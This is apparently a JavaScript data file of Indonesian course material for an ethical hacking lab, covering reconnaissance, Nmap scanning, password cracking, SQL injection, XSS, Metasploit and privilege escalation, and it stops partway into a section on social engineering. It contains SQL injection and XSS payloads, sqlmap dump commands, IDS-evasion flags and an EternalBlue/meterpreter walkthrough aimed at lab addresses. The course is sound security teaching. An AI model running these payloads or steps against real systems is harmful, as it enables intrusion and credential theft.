// Material/Theory content for each lab session
export const labMaterials = {
  // Session 1: Introduction to Ethical Hacking & Reconnaissance
  session1: {
    theoryContent: `
# 📚 Pengenalan Ethical Hacking & Reconnaissance

## 🎯 Apa itu Ethical Hacking?

**Ethical Hacking** (juga disebut Penetration Testing atau "Pentesting") adalah praktik menguji keamanan sistem komputer, jaringan, atau aplikasi dengan izin dari pemiliknya. Tujuannya adalah menemukan kerentanan sebelum penyerang jahat (malicious hacker) menemukannya.

### Perbedaan Hacker:
| Tipe | Deskripsi |
|------|-----------|
| **White Hat** | Hacker etis yang bekerja dengan izin untuk menemukan kelemahan keamanan |
| **Black Hat** | Hacker jahat yang mengeksploitasi sistem tanpa izin untuk keuntungan pribadi |
| **Grey Hat** | Berada di antara keduanya, mungkin tanpa izin tapi tidak bermaksud jahat |

---

## 🔍 Metodologi Penetration Testing

Penetration testing mengikuti metodologi terstruktur yang terdiri dari beberapa fase:

### 1. **Reconnaissance (Pengintaian)**
Fase pengumpulan informasi tentang target. Dibagi menjadi:
- **Passive Reconnaissance**: Mengumpulkan informasi tanpa berinteraksi langsung dengan target (OSINT)
- **Active Reconnaissance**: Berinteraksi langsung dengan target (scanning, probing)

### 2. **Scanning & Enumeration**
Mengidentifikasi:
- Port yang terbuka
- Layanan yang berjalan
- Versi software
- Kerentanan potensial

### 3. **Gaining Access (Exploitation)**
Mengeksploitasi kerentanan yang ditemukan untuk mendapatkan akses ke sistem.

### 4. **Maintaining Access**
Mempertahankan akses ke sistem yang telah dikompromikan.

### 5. **Covering Tracks & Reporting**
Membersihkan jejak dan membuat laporan komprehensif.

---

## 🌐 OSINT (Open Source Intelligence)

OSINT adalah teknik mengumpulkan informasi dari sumber publik yang tersedia secara legal. Sumber OSINT meliputi:

### Sumber Informasi:
- **Domain & DNS**: WHOIS, DNS records, subdomains
- **Search Engines**: Google dorks, Bing, Shodan
- **Social Media**: LinkedIn, Twitter, Facebook
- **Public Records**: Database perusahaan, paten, dokumen publik
- **Code Repositories**: GitHub, GitLab, leaked credentials

### Contoh Google Dorks:
\`\`\`
site:example.com filetype:pdf     # Cari file PDF di domain
inurl:admin site:example.com      # Cari halaman admin
"password" filetype:txt           # Cari file text berisi password
\`\`\`

---

## ⚖️ Aspek Legal & Etika

### Yang HARUS dilakukan:
✅ Selalu dapatkan **izin tertulis** sebelum melakukan pengujian
✅ Dokumentasikan semua aktivitas dengan detail
✅ Laporkan semua temuan kepada klien
✅ Jaga kerahasiaan data yang ditemukan
✅ Ikuti scope yang telah disepakati

### Yang TIDAK BOLEH dilakukan:
❌ Mengakses sistem tanpa izin
❌ Memodifikasi atau menghapus data
❌ Menyebarkan informasi sensitif
❌ Melakukan serangan DoS tanpa izin
❌ Melampaui batas scope pengujian

---

## 🛠️ Tools yang Akan Digunakan

| Tool | Fungsi |
|------|--------|
| \`whois\` | Lookup informasi registrasi domain |
| \`nslookup\` | Query DNS records |
| \`dig\` | Advanced DNS query tool |
| \`host\` | Simple DNS lookup |
| \`traceroute\` | Trace network path |
| \`ping\` | Test konektivitas jaringan |

---

## 📋 Tugas Praktikum

Dalam praktikum ini, Anda akan:
1. Melakukan WHOIS lookup pada target domain
2. Mengumpulkan informasi DNS (A, MX, NS records)
3. Mengidentifikasi subdomain
4. Melakukan passive reconnaissance
5. Mendokumentasikan semua temuan

**Target**: example-company.com (192.168.1.100)

> ⚠️ **Ingat**: Ini adalah lingkungan simulasi. Jangan pernah melakukan teknik ini pada sistem tanpa izin!
`,
    prerequisites: [
      'Pemahaman dasar jaringan komputer (IP, DNS, HTTP)',
      'Familiar dengan command line Linux',
      'Pengetahuan dasar tentang protokol internet',
    ],
    resources: [
      { title: 'OWASP Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/', type: 'documentation' },
      { title: 'PTES - Penetration Testing Execution Standard', url: 'http://www.pentest-standard.org/', type: 'documentation' },
      { title: 'OSINT Framework', url: 'https://osintframework.com/', type: 'tool' },
      { title: 'Kali Linux Documentation', url: 'https://www.kali.org/docs/', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'whois <domain>', description: 'Mencari informasi registrasi domain termasuk pemilik, tanggal registrasi, dan nameserver', example: 'whois example-company.com' },
      { command: 'nslookup <domain>', description: 'Query DNS untuk mendapatkan IP address dari domain', example: 'nslookup example-company.com' },
      { command: 'dig <domain> <record_type>', description: 'Advanced DNS query dengan berbagai tipe record (A, MX, NS, TXT)', example: 'dig example-company.com MX' },
      { command: 'host <domain>', description: 'Simple DNS lookup untuk mendapatkan IP dan mail server', example: 'host example-company.com' },
      { command: 'ping <target>', description: 'Test konektivitas ke target dan mengukur latency', example: 'ping 192.168.1.100' },
      { command: 'traceroute <target>', description: 'Melacak jalur paket ke target melalui berbagai router', example: 'traceroute example-company.com' },
    ],
  },

  // Session 2: Network Scanning with Nmap
  session2: {
    theoryContent: `
# 🔍 Network Scanning dengan Nmap

## 🎯 Apa itu Network Scanning?

**Network Scanning** adalah proses mengidentifikasi host aktif, port terbuka, dan layanan yang berjalan pada sebuah jaringan. Ini adalah langkah penting setelah reconnaissance dalam metodologi penetration testing.

---

## 🛠️ Nmap - Network Mapper

**Nmap** (Network Mapper) adalah tool scanning paling populer dan powerful untuk:
- Host discovery
- Port scanning
- Service/version detection
- OS detection
- Vulnerability scanning (dengan NSE scripts)

---

## 📊 Jenis-jenis Port Scan

### 1. TCP Connect Scan (-sT)
\`\`\`
┌─────────┐     SYN      ┌─────────┐
│ Scanner │────────────▶│ Target  │
│         │◀────────────│         │
└─────────┘   SYN/ACK    └─────────┘
     │                        
     └──────── ACK ──────────▶ (Connection established)
\`\`\`
- Full TCP handshake
- Paling akurat tapi mudah terdeteksi
- Tidak memerlukan root privilege

### 2. SYN Scan (-sS) "Stealth Scan"
\`\`\`
┌─────────┐     SYN      ┌─────────┐
│ Scanner │────────────▶│ Target  │
│         │◀────────────│         │
└─────────┘   SYN/ACK    └─────────┘
     │                        
     └──────── RST ──────────▶ (Connection reset)
\`\`\`
- Tidak menyelesaikan handshake (half-open)
- Lebih cepat dan kurang terdeteksi
- Memerlukan root privilege

### 3. UDP Scan (-sU)
- Scan port UDP
- Lebih lambat karena tidak ada acknowledgment
- Penting untuk DNS, SNMP, DHCP

---

## 🔢 Port States

| State | Deskripsi |
|-------|-----------|
| **open** | Port menerima koneksi, ada layanan aktif |
| **closed** | Port accessible tapi tidak ada layanan |
| **filtered** | Firewall/filter memblokir probe |
| **unfiltered** | Port accessible, tidak bisa tentukan open/closed |
| **open\|filtered** | Tidak bisa tentukan open atau filtered |

---

## 🎯 Common Ports & Services

| Port | Service | Deskripsi |
|------|---------|-----------|
| 21 | FTP | File Transfer Protocol |
| 22 | SSH | Secure Shell |
| 23 | Telnet | Unencrypted remote login |
| 25 | SMTP | Email sending |
| 53 | DNS | Domain Name System |
| 80 | HTTP | Web server |
| 443 | HTTPS | Secure web server |
| 445 | SMB | Windows file sharing |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote Desktop |

---

## 📋 Nmap Scan Techniques

### Host Discovery
\`\`\`bash
nmap -sn 192.168.1.0/24     # Ping scan (no port scan)
nmap -Pn 192.168.1.100      # Skip host discovery
\`\`\`

### Port Scanning
\`\`\`bash
nmap 192.168.1.100          # Scan top 1000 ports
nmap -p- 192.168.1.100      # Scan ALL ports (65535)
nmap -p 22,80,443 target    # Scan specific ports
nmap -p 1-1000 target       # Scan port range
\`\`\`

### Service & Version Detection
\`\`\`bash
nmap -sV 192.168.1.100      # Detect service versions
nmap -O 192.168.1.100       # OS detection
nmap -A 192.168.1.100       # Aggressive scan (OS + version + scripts)
\`\`\`

### Output Options
\`\`\`bash
nmap -oN scan.txt target    # Normal output
nmap -oX scan.xml target    # XML output
nmap -oG scan.gnmap target  # Grepable output
\`\`\`

---

## ⚡ Timing Templates

| Template | Deskripsi |
|----------|-----------|
| -T0 | Paranoid (sangat lambat, IDS evasion) |
| -T1 | Sneaky |
| -T2 | Polite |
| -T3 | Normal (default) |
| -T4 | Aggressive (recommended) |
| -T5 | Insane (mungkin kurang akurat) |

---

## 🛡️ Firewall/IDS Evasion

\`\`\`bash
nmap -f target              # Fragment packets
nmap --mtu 24 target        # Custom MTU
nmap -D RND:10 target       # Decoy scan
nmap --spoof-mac 0 target   # Spoof MAC address
\`\`\`

---

## 📋 Tugas Praktikum

Dalam praktikum ini, Anda akan:
1. Melakukan ping scan untuk menemukan host aktif
2. Melakukan SYN scan pada target
3. Mendeteksi versi service yang berjalan
4. Mengidentifikasi sistem operasi target
5. Mendokumentasikan semua port dan service yang ditemukan

**Target**: 192.168.1.100 (web.example-company.com)

> 💡 **Tips**: Gunakan \`-T4\` untuk scan lebih cepat dan \`-v\` untuk output verbose.
`,
    prerequisites: [
      'Pemahaman TCP/IP dan model OSI',
      'Pengetahuan tentang port dan protokol',
      'Pengalaman dengan command line',
      'Menyelesaikan Session 1 (Reconnaissance)',
    ],
    resources: [
      { title: 'Nmap Official Documentation', url: 'https://nmap.org/docs.html', type: 'documentation' },
      { title: 'Nmap Cheat Sheet', url: 'https://www.stationx.net/nmap-cheat-sheet/', type: 'cheatsheet' },
      { title: 'Nmap NSE Scripts', url: 'https://nmap.org/nsedoc/', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'nmap -sn <target>', description: 'Ping scan - hanya cek host aktif tanpa port scan', example: 'nmap -sn 192.168.1.0/24' },
      { command: 'nmap -sS <target>', description: 'SYN scan (stealth) - half-open scan yang cepat dan tidak mudah terdeteksi', example: 'nmap -sS 192.168.1.100' },
      { command: 'nmap -sV <target>', description: 'Version detection - identifikasi versi service yang berjalan', example: 'nmap -sV 192.168.1.100' },
      { command: 'nmap -O <target>', description: 'OS detection - identifikasi sistem operasi target', example: 'nmap -O 192.168.1.100' },
      { command: 'nmap -A <target>', description: 'Aggressive scan - gabungan OS detection, version, scripts, traceroute', example: 'nmap -A 192.168.1.100' },
      { command: 'nmap -p <ports> <target>', description: 'Scan port spesifik atau range', example: 'nmap -p 22,80,443 192.168.1.100' },
    ],
  },

  // Session 3: Vulnerability Assessment & Password Cracking
  session3: {
    theoryContent: `
# 🔐 Vulnerability Assessment & Password Cracking

## 🎯 Apa itu Vulnerability Assessment?

**Vulnerability Assessment** adalah proses sistematis untuk mengidentifikasi, mengklasifikasi, dan memprioritaskan kerentanan keamanan dalam sistem komputer, aplikasi, dan infrastruktur jaringan.

---

## 📊 CVE & CVSS

### CVE (Common Vulnerabilities and Exposures)
CVE adalah sistem standar untuk mengidentifikasi kerentanan keamanan yang telah diketahui publik.

Format: **CVE-YEAR-NUMBER**
Contoh: CVE-2021-44228 (Log4Shell)

### CVSS (Common Vulnerability Scoring System)
Sistem scoring untuk mengukur severity kerentanan:

| Score | Severity |
|-------|----------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

---

## 🔍 Tools Vulnerability Scanning

### Searchsploit
\`\`\`bash
searchsploit apache 2.4      # Cari exploit Apache 2.4
searchsploit -m 12345        # Copy exploit ke current dir
searchsploit --update        # Update database
\`\`\`

### Nikto (Web Vulnerability Scanner)
\`\`\`bash
nikto -h http://target.com   # Scan web server
nikto -h target -p 8080      # Scan port spesifik
\`\`\`

---

## 🔑 Password Cracking

### Jenis-jenis Hash

| Algorithm | Length | Contoh |
|-----------|--------|--------|
| MD5 | 32 chars | 5d41402abc4b2a76b9719d911017c592 |
| SHA-1 | 40 chars | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA-256 | 64 chars | 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c... |
| bcrypt | 60 chars | $2a$10$... |

### Hashid - Identify Hash Type
\`\`\`bash
hashid '5d41402abc4b2a76b9719d911017c592'
hashid -m '$2a$10$...'  # Show hashcat mode
\`\`\`

---

## 🔨 John the Ripper

John adalah tool password cracking yang powerful dan mendukung banyak format hash.

### Basic Usage
\`\`\`bash
john hashes.txt              # Crack dengan default wordlist
john --wordlist=rockyou.txt hashes.txt  # Custom wordlist
john --show hashes.txt       # Show cracked passwords
\`\`\`

### Attack Modes

#### 1. Dictionary Attack
\`\`\`bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
\`\`\`

#### 2. Brute Force
\`\`\`bash
john --incremental hashes.txt
\`\`\`

#### 3. Rule-based Attack
\`\`\`bash
john --wordlist=words.txt --rules hashes.txt
\`\`\`

---

## 📋 Password Attack Types

### 1. Dictionary Attack
Menggunakan daftar kata (wordlist) yang umum digunakan sebagai password.

**Popular Wordlists:**
- rockyou.txt (14 juta+ passwords)
- darkweb2017-top10000.txt
- common-passwords.txt

### 2. Brute Force Attack
Mencoba semua kombinasi karakter yang mungkin.
\`\`\`
Charset: abcdefghijklmnopqrstuvwxyz
Length 4: 26^4 = 456,976 combinations
Length 6: 26^6 = 308,915,776 combinations
\`\`\`

### 3. Rainbow Table Attack
Menggunakan tabel precomputed hashes untuk lookup cepat.

### 4. Hybrid Attack
Kombinasi dictionary + rules (contoh: password123, Password!, p@ssw0rd)

---

## 🛡️ Password Security Best Practices

### Untuk Users:
- ✅ Gunakan password minimal 12 karakter
- ✅ Kombinasi uppercase, lowercase, angka, simbol
- ✅ Gunakan password manager
- ✅ Aktifkan 2FA
- ❌ Jangan gunakan informasi personal
- ❌ Jangan reuse password

### Untuk Developers:
- ✅ Gunakan algoritma hashing yang kuat (bcrypt, Argon2)
- ✅ Implementasi salt yang unik per user
- ✅ Rate limiting pada login
- ✅ Account lockout setelah failed attempts

---

## 📋 Tugas Praktikum

Dalam praktikum ini, Anda akan:
1. Mencari kerentanan menggunakan searchsploit
2. Mengidentifikasi jenis hash dengan hashid
3. Melakukan password cracking dengan John the Ripper
4. Memahami metodologi vulnerability assessment
5. Mendokumentasikan temuan dan rekomendasi

**Target Hash**: 5d41402abc4b2a76b9719d911017c592 (MD5)

> ⚠️ **Etika**: Password cracking hanya boleh dilakukan pada hash yang Anda memiliki izin untuk crack!
`,
    prerequisites: [
      'Menyelesaikan Session 1 dan 2',
      'Pemahaman dasar kriptografi',
      'Familiar dengan konsep hashing',
      'Pengetahuan tentang authentication',
    ],
    resources: [
      { title: 'CVE Database', url: 'https://cve.mitre.org/', type: 'database' },
      { title: 'Exploit Database', url: 'https://www.exploit-db.com/', type: 'database' },
      { title: 'John the Ripper Wiki', url: 'https://www.openwall.com/john/doc/', type: 'documentation' },
      { title: 'CrackStation', url: 'https://crackstation.net/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'searchsploit <keyword>', description: 'Mencari exploit berdasarkan keyword di Exploit-DB', example: 'searchsploit apache 2.4' },
      { command: 'hashid <hash>', description: 'Mengidentifikasi jenis/algoritma hash', example: "hashid '5d41402abc4b2a76b9719d911017c592'" },
      { command: 'john --wordlist=<file> <hashes>', description: 'Crack password hash menggunakan wordlist', example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
      { command: 'john --show <hashes>', description: 'Menampilkan password yang sudah di-crack', example: 'john --show hashes.txt' },
      { command: 'nikto -h <target>', description: 'Scan web server untuk kerentanan umum', example: 'nikto -h http://192.168.1.100' },
    ],
  },

  // Session 4: UTS
  session4: {
    theoryContent: `
# 📝 UTS - Reconnaissance & Scanning Project

## 🎯 Tujuan Ujian

Ujian Tengah Semester (UTS) ini dirancang untuk menguji pemahaman dan kemampuan praktis Anda dalam:
1. **Information Gathering (OSINT)**
2. **Network Scanning**
3. **Vulnerability Assessment**

---

## 📋 Scope Pengujian

### Target
- **Domain**: demo-company.com
- **IP Range**: 10.0.0.0/24
- **Primary Target**: 10.0.0.50

### Deliverables
1. Laporan OSINT tentang target
2. Hasil network scanning lengkap
3. Daftar kerentanan yang ditemukan
4. Rekomendasi mitigasi

---

## 📊 Rubrik Penilaian

| Komponen | Bobot | Kriteria |
|----------|-------|----------|
| OSINT Gathering | 25% | Kelengkapan informasi yang dikumpulkan |
| Network Scanning | 25% | Akurasi dan detail hasil scanning |
| Vulnerability Identification | 25% | Identifikasi kerentanan yang tepat |
| Report Quality | 25% | Format, kejelasan, dan profesionalisme laporan |

---

## ⏱️ Waktu Pengerjaan

- **Durasi**: 120 menit
- **Submission**: Melalui sistem setelah semua objective selesai

---

## 📝 Format Laporan

### 1. Executive Summary
Ringkasan temuan utama untuk audience non-teknis.

### 2. Methodology
Langkah-langkah yang dilakukan selama pengujian.

### 3. Findings
Detail semua temuan dengan evidence (screenshot commands).

### 4. Risk Assessment
Penilaian risiko untuk setiap temuan.

### 5. Recommendations
Rekomendasi mitigasi yang spesifik dan actionable.

---

## 🛠️ Tools yang Diizinkan

| Category | Tools |
|----------|-------|
| OSINT | whois, nslookup, dig, host |
| Scanning | nmap, ping, traceroute |
| Vuln Assessment | searchsploit, nikto |

---

## ⚠️ Peraturan

1. ✅ Semua aktivitas harus dilakukan dalam scope yang ditentukan
2. ✅ Dokumentasikan setiap langkah yang dilakukan
3. ❌ Dilarang melakukan serangan DoS
4. ❌ Dilarang memodifikasi atau menghapus data
5. ❌ Dilarang berbagi jawaban dengan mahasiswa lain

---

## 💡 Tips Sukses

1. **Baca instruksi dengan teliti** sebelum memulai
2. **Lakukan reconnaissance menyeluruh** sebelum scanning
3. **Dokumentasikan semua command** yang dijalankan
4. **Prioritaskan temuan** berdasarkan severity
5. **Review laporan** sebelum submit

> 🍀 **Good luck!** Tunjukkan kemampuan terbaik Anda!
`,
    prerequisites: [
      'Menyelesaikan Session 1, 2, dan 3',
      'Memahami metodologi penetration testing',
      'Familiar dengan semua tools yang telah dipelajari',
      'Kemampuan menulis laporan teknis',
    ],
    resources: [
      { title: 'Penetration Testing Report Template', url: '#', type: 'template' },
      { title: 'PTES Reporting Guidelines', url: 'http://www.pentest-standard.org/index.php/Reporting', type: 'documentation' },
    ],
    keyCommands: [
      { command: 'Semua command dari Session 1-3', description: 'Review kembali semua perintah yang telah dipelajari', example: 'whois, nslookup, nmap, searchsploit, dll' },
    ],
  },

  // Session 5: Web Application Security & SQL Injection
  session5: {
    theoryContent: `
# 🌐 Web Application Security & SQL Injection

## 🎯 Overview

Web Application Security adalah bidang yang fokus pada keamanan aplikasi berbasis web. Menurut OWASP, kerentanan web tetap menjadi salah satu vektor serangan paling umum.

---

## 📊 OWASP Top 10 (2021)

| Rank | Vulnerability |
|------|--------------|
| 1 | Broken Access Control |
| 2 | Cryptographic Failures |
| 3 | **Injection (SQL, Command, etc.)** |
| 4 | Insecure Design |
| 5 | Security Misconfiguration |
| 6 | Vulnerable Components |
| 7 | Authentication Failures |
| 8 | Software Integrity Failures |
| 9 | Logging & Monitoring Failures |
| 10 | Server-Side Request Forgery |

---

## 💉 SQL Injection

### Apa itu SQL Injection?
SQL Injection adalah kerentanan yang memungkinkan penyerang menyisipkan kode SQL berbahaya ke dalam query aplikasi.

### Contoh Vulnerable Code
\`\`\`php
// VULNERABLE!
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
\`\`\`

### Attack Examples

#### 1. Authentication Bypass
\`\`\`
Username: admin' --
Password: anything
\`\`\`
Query menjadi:
\`\`\`sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
\`\`\`

#### 2. UNION-based SQLi
\`\`\`
id=1 UNION SELECT username,password FROM users--
\`\`\`

#### 3. Boolean-based Blind SQLi
\`\`\`
id=1 AND 1=1  (true - normal response)
id=1 AND 1=2  (false - different response)
\`\`\`

#### 4. Time-based Blind SQLi
\`\`\`
id=1; WAITFOR DELAY '0:0:5'--  (delay 5 seconds if vulnerable)
\`\`\`

---

## 🔧 SQLMap

**SQLMap** adalah tool otomatis untuk mendeteksi dan mengeksploitasi SQL injection.

### Basic Usage
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

### Common Options
| Option | Description |
|--------|-------------|
| \`-u\` | Target URL with parameter |
| \`--dbs\` | Enumerate databases |
| \`--tables\` | Enumerate tables |
| \`--dump\` | Dump table data |
| \`-D <db>\` | Specify database |
| \`-T <table>\` | Specify table |
| \`--batch\` | Non-interactive mode |

### Attack Flow
\`\`\`bash
# 1. Test for SQLi
sqlmap -u "http://target.com/page?id=1"

# 2. Get databases
sqlmap -u "http://target.com/page?id=1" --dbs

# 3. Get tables from database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# 4. Dump table content
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
\`\`\`

---

## 🕷️ Cross-Site Scripting (XSS)

### Types of XSS

#### 1. Reflected XSS
Payload di-reflect langsung dari request ke response.
\`\`\`html
<script>alert('XSS')</script>
\`\`\`

#### 2. Stored XSS
Payload disimpan di database dan ditampilkan ke users lain.

#### 3. DOM-based XSS
Payload dieksekusi di client-side tanpa server involvement.

### XSS Payloads
\`\`\`html
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert(String.fromCharCode(88,83,83))</script>
\`\`\`

---

## 🔍 Directory Bruteforce

### Dirb
\`\`\`bash
dirb http://target.com /usr/share/dirb/wordlists/common.txt
dirb http://target.com -o results.txt
\`\`\`

### Common Directories
\`\`\`
/admin, /login, /dashboard, /api
/backup, /config, /uploads, /temp
/.git, /.svn, /.env
/robots.txt, /sitemap.xml
\`\`\`

---

## 🛡️ Mitigation

### SQL Injection Prevention
\`\`\`php
// Use Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
\`\`\`

### XSS Prevention
- Output encoding/escaping
- Content Security Policy (CSP)
- Input validation
- HttpOnly cookies

---

## 📋 Tugas Praktikum

1. Identifikasi titik injeksi SQL pada target
2. Gunakan SQLMap untuk enumerasi database
3. Extract informasi sensitif dari database
4. Uji kerentanan XSS pada form input
5. Lakukan directory enumeration

**Target**: http://192.168.1.100 (vulnerable web app)

> ⚠️ **Peringatan**: Hanya lakukan pada sistem yang Anda miliki izin!
`,
    prerequisites: [
      'Menyelesaikan Session 1-4',
      'Pemahaman HTTP/HTTPS protocol',
      'Pengetahuan dasar SQL',
      'Familiar dengan HTML/JavaScript',
    ],
    resources: [
      { title: 'OWASP Top 10', url: 'https://owasp.org/Top10/', type: 'documentation' },
      { title: 'SQLMap User Manual', url: 'https://github.com/sqlmapproject/sqlmap/wiki/Usage', type: 'documentation' },
      { title: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security', type: 'course' },
      { title: 'XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', type: 'cheatsheet' },
    ],
    keyCommands: [
      { command: 'sqlmap -u <url> --dbs', description: 'Scan URL untuk SQL injection dan enumerate database', example: 'sqlmap -u "http://target.com/page?id=1" --dbs' },
      { command: 'sqlmap -u <url> -D <db> --tables', description: 'Enumerate tables dalam database', example: 'sqlmap -u "http://target.com/page?id=1" -D users_db --tables' },
      { command: 'sqlmap -u <url> -D <db> -T <table> --dump', description: 'Dump data dari table', example: 'sqlmap -u "http://target.com/page?id=1" -D users_db -T users --dump' },
      { command: 'dirb <url> <wordlist>', description: 'Directory bruteforce untuk menemukan hidden files/folders', example: 'dirb http://target.com /usr/share/dirb/wordlists/common.txt' },
      { command: 'test-xss <url>', description: 'Test untuk kerentanan XSS pada URL', example: 'test-xss http://target.com/search?q=test' },
    ],
  },

  // Session 6: Metasploit Framework & Privilege Escalation
  session6: {
    theoryContent: `
# ⚔️ Metasploit Framework & Privilege Escalation

## 🎯 Apa itu Metasploit?

**Metasploit Framework** adalah platform penetration testing paling populer dan powerful. Dikembangkan oleh Rapid7, Metasploit menyediakan:
- Database exploit yang komprehensif
- Payload generation
- Post-exploitation tools
- Evasion techniques

---

## 🏗️ Arsitektur Metasploit

\`\`\`
┌─────────────────────────────────────────┐
│           Metasploit Framework          │
├─────────────────────────────────────────┤
│  Exploits  │  Payloads  │   Auxiliary   │
├────────────┼────────────┼───────────────┤
│  Encoders  │    Nops    │     Post      │
└─────────────────────────────────────────┘
\`\`\`

### Module Types:
| Type | Description |
|------|-------------|
| **Exploits** | Code that takes advantage of vulnerabilities |
| **Payloads** | Code executed after exploitation |
| **Auxiliary** | Scanners, fuzzers, etc. |
| **Post** | Post-exploitation modules |
| **Encoders** | Obfuscate payloads |

---

## 🚀 Basic Workflow

### 1. Start Metasploit
\`\`\`bash
msfconsole
\`\`\`

### 2. Search for Exploits
\`\`\`bash
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017-0144
\`\`\`

### 3. Use Exploit
\`\`\`bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
\`\`\`

### 4. Show Options
\`\`\`bash
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > show payloads
\`\`\`

### 5. Configure Options
\`\`\`bash
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
\`\`\`

### 6. Execute
\`\`\`bash
msf6 exploit(ms17_010_eternalblue) > exploit
# atau
msf6 exploit(ms17_010_eternalblue) > run
\`\`\`

---

## 🐚 Meterpreter

**Meterpreter** adalah advanced payload yang berjalan di memory dan menyediakan shell powerful.

### Core Commands
\`\`\`bash
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user
meterpreter > getsystem        # Privilege escalation
meterpreter > hashdump         # Dump password hashes
meterpreter > shell            # Drop to system shell
\`\`\`

### File Operations
\`\`\`bash
meterpreter > pwd              # Current directory
meterpreter > ls               # List files
meterpreter > download file    # Download file
meterpreter > upload file      # Upload file
\`\`\`

### Process Management
\`\`\`bash
meterpreter > ps               # List processes
meterpreter > migrate PID      # Migrate to process
meterpreter > background       # Background session
\`\`\`

---

## 📈 Privilege Escalation

### Windows Privilege Escalation

#### 1. Using getsystem
\`\`\`bash
meterpreter > getsystem
\`\`\`

#### 2. Local Exploits
\`\`\`bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
\`\`\`

#### 3. Common Techniques
- Unquoted service paths
- Weak service permissions
- DLL hijacking
- Token impersonation
- Scheduled tasks

### Linux Privilege Escalation

#### 1. SUID Binaries
\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

#### 2. Sudo Misconfigurations
\`\`\`bash
sudo -l
\`\`\`

#### 3. Kernel Exploits
\`\`\`bash
uname -a  # Check kernel version
searchsploit linux kernel 4.4.0
\`\`\`

---

## 🔥 Famous Exploits

| CVE | Name | Target |
|-----|------|--------|
| CVE-2017-0144 | EternalBlue | Windows SMB |
| CVE-2014-6271 | Shellshock | Bash |
| CVE-2021-44228 | Log4Shell | Java |
| CVE-2019-0708 | BlueKeep | Windows RDP |

---

## 📋 Tugas Praktikum

1. Launch msfconsole dan familiarisasi dengan interface
2. Search dan select exploit yang sesuai
3. Configure exploit options (RHOSTS, LHOST, payload)
4. Execute exploit dan dapatkan shell
5. Lakukan privilege escalation
6. Collect information dari compromised system

**Target**: 192.168.1.100 (Windows Server)

> ⚠️ **Peringatan**: Metasploit adalah tool powerful. Gunakan hanya pada sistem yang Anda memiliki izin!
`,
    prerequisites: [
      'Menyelesaikan Session 1-5',
      'Pemahaman networking TCP/IP',
      'Pengetahuan tentang operating systems',
      'Familiar dengan vulnerabilities dan CVE',
    ],
    resources: [
      { title: 'Metasploit Unleashed', url: 'https://www.offensive-security.com/metasploit-unleashed/', type: 'course' },
      { title: 'Metasploit Documentation', url: 'https://docs.metasploit.com/', type: 'documentation' },
      { title: 'GTFOBins (Linux PrivEsc)', url: 'https://gtfobins.github.io/', type: 'tool' },
      { title: 'LOLBAS (Windows PrivEsc)', url: 'https://lolbas-project.github.io/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'msfconsole', description: 'Start Metasploit Framework console', example: 'msfconsole' },
      { command: 'search <keyword>', description: 'Search for exploits, payloads, or modules', example: 'search type:exploit windows smb' },
      { command: 'use <module>', description: 'Select a module to use', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { command: 'show options', description: 'Display required and optional settings for current module', example: 'show options' },
      { command: 'set <option> <value>', description: 'Set a value for an option', example: 'set RHOSTS 192.168.1.100' },
      { command: 'exploit / run', description: 'Execute the current module', example: 'exploit' },
      { command: 'sessions', description: 'List active sessions', example: 'sessions -l' },
    ],
  },

  // Session 7: Report Writing, Social Engineering & CTF
  session7: {
    theoryContent: `
# 📝 Report Writing, Social Engineering & CTF

## 🎯 Overview

Session ini mencakup tiga skill penting:
1. **Professional Report Writing** - Dokumentasi yang efektif
2. **Social Engineering** - Memahami human factor
3. **CTF Challenges** - Mengasah problem-solving skills

---

## 📄 Penetration Testing Report

### Struktur Report Profesional

#### 1. Executive Summary
- Overview untuk audience non-teknis
- Key findings dan risk level
- Business impact
- High-level recommendations

#### 2. Methodology
\`\`\`
Planning → Reconnaissance → Scanning → 
Exploitation → Post-Exploitation → Reporting
\`\`\`

#### 3. Scope & Objectives
- Target systems/networks
- Testing timeline
- Out-of-scope items
- Rules of engagement

#### 4. Findings
Untuk setiap finding, sertakan:
| Element | Description |
|---------|-------------|
| Title | Clear, descriptive name |
| Severity | Critical/High/Medium/Low |
| CVSS Score | 0.0 - 10.0 |
| Description | Technical explanation |
| Evidence | Screenshots, logs, commands |
| Impact | Business/technical impact |
| Remediation | How to fix |

#### 5. Recommendations
- Prioritized by risk
- Specific & actionable
- Include timeline

---

## 🎭 Social Engineering

### Apa itu Social Engineering?
Teknik manipulasi psikologis untuk mendapatkan informasi atau akses tanpa menggunakan technical exploitation.

### Common Techniques

#### 1. Phishing
\`\`\`
Email palsu yang meniru organisasi legitimate
untuk mencuri credentials atau install malware
\`\`\`

